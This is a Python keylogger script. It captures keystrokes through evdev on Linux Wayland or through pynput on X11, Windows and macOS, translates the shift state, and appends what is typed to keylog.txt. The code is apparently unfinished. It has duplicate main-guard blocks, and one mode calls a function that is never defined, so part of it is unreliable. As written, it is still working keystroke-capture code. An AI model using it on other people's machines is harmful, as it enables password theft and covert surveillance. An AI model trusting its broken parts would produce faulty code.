import platform
import os
import sys
from datetime import datetime

import evdev
from datetime import datetime

LOG_FILE = "keylog.txt"
WAYLAND_KEYBOARD_DEVICE = '/dev/input/event3'
log_buffer = ""
is_shift_pressed = False

shift_map = {
    '1': '!', '2': '@', '3': '#', '4': '$', '5': '%', '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
    '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|', ';': ':', "'": '"', ',': '<', '.': '>', '/': '?',
    '`': '~'
}

normal_map = {
    'GRAVE': '`', 'MINUS': '-', 'EQUAL': '=', 'LEFTBRACE': '[', 'RIGHTBRACE': ']', 'BACKSLASH': '\\',
    'SEMICOLON': ';', 'APOSTROPHE': "'", 'COMMA': ',', 'DOT': '.', 'SLASH': '/', 'SPACE': ' ', 'ENTER': '\n', 'TAB': '\t'
}

def write_buffer_to_file():
    global log_buffer
    if log_buffer:
        with open(LOG_FILE, "a") as f:
            f.write(log_buffer)
        log_buffer = ""

def append_to_log(char):
    global log_buffer
    print(char, end="", flush=True)
    log_buffer += char
    if char == " " or char == "\n":
        write_buffer_to_file()

def process_key(event_code):
    """
    Translates raw evdev codes into characters, respecting Shift state.
    """
    global is_shift_pressed
    key = event_code.replace("KEY_", "")
    if key in ("LEFTSHIFT", "RIGHTSHIFT"):
        return None
    if key == "BACKSPACE":
        return "[BSP]"
    if key == "CAPSLOCK":
        return "[CAPS]"
    char = ""

    if key in normal_map:
        char = normal_map[key]
    elif len(key) == 1:
        char = key.lower()
    else:
        return f"[{key}]"

    if is_shift_pressed:
        if char.isalpha():
            return char.upper()
        if char in shift_map:
            return shift_map[char]

    return char

def run_evdev_mode():
    global is_shift_pressed
    print(f"[*] Mode: WAYLAND (Kernel Level). Hooking {WAYLAND_KEYBOARD_DEVICE}...")

    try:
        device = evdev.InputDevice(WAYLAND_KEYBOARD_DEVICE)
        print(f"[*] Success! Listening on: {device.name}")
        print("[*] Press CTRL+C to stop.")
        with open(LOG_FILE, "a") as f:
            f.write(f"\n--- Started logging at {datetime.now()} ---\n")

        for event in device.read_loop():
            if event.type == evdev.ecodes.EV_KEY:
                raw_key = evdev.ecodes.KEY[event.code]
                if raw_key in ("KEY_LEFTSHIFT", "KEY_RIGHTSHIFT"):
                    is_shift_pressed = (event.value == 1)
                    continue
                if event.value == 1:
                    char = process_key(raw_key)
                    if char:
                        append_to_log(char)

    except KeyboardInterrupt:
        print("\n[*] Stopping... Saving remaining data.")
        write_buffer_to_file()
        print(f"[*] Done. Data saved to {LOG_FILE}")

    except FileNotFoundError:
        print(f"\n[!] ERROR: Device '{WAYLAND_KEYBOARD_DEVICE}' not found.")
    except PermissionError:
        print(f"\n[!] ERROR: Permission denied. Run with 'sudo'.")
    except OSError as e:
        print(f"\n[!] OS Error: {e}")

if __name__ == "__main__":
    run_evdev_mode()
def run_pynput_mode():
    """Logic for X11 / Windows / macOS using pynput"""
    print("[*] Mode: STANDARD (X11/Windows). Hooking global input...")

    try:
        from pynput.keyboard import Key, Listener
    except ImportError:
        print("\n[!] ERROR: 'pynput' library missing.")
        print("    Run: pip install pynput")
        return

    log_to_file(f"\n--- Started pynput logging at {datetime.now()} ---\n")

    def on_press(key):
        try:
            k = key.char
        except AttributeError:
            k = str(key)

        msg = f"{k}"
        print(msg, flush=True)
        log_to_file(msg + "\n")

    def on_release(key):
        if key == Key.esc:
            print("\n[*] ESC pressed. Stopping...")
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def main():
    os_name = platform.system()

    is_wayland = False
    if os_name == "Linux":
        if "WAYLAND_DISPLAY" in os.environ:
            is_wayland = True
        elif os.environ.get("XDG_SESSION_TYPE") == "wayland":
            is_wayland = True

    print("="*50)
    print(f" OS Detected       : {os_name}")
    print(f" Wayland Detected  : {is_wayland}")
    print("="*50)

    if os_name == "Linux" and is_wayland:
        run_evdev_mode()
    else:
        run_pynput_mode()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Script terminated by user.")
